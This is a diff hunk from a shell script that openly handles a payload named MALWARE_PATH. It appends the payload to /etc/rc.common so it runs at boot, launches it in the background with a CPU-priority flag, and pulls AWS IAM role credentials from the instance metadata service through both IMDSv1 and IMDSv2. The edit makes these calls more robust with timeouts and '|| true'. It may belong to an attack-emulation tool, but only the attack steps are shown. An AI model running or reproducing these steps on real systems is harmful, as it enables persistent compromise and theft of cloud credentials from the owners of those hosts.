@@ -28,8 +28,8 @@ echo "$MALWARE_PATH --cpu-priority 4 &" >> /etc/rc.common 2>/dev/null || true
 "$MALWARE_PATH" --cpu-priority 4 &
 
 # Retrieve IMDS v1 credentials
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name
+curl --connect-timeout 5.0 http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name || true
 
 # Retrieve IMDS v2
-TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
-    && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name
+TOKEN=`curl --connect-timeout 5.0 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
+    && curl --connect-timeout 5.0 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name
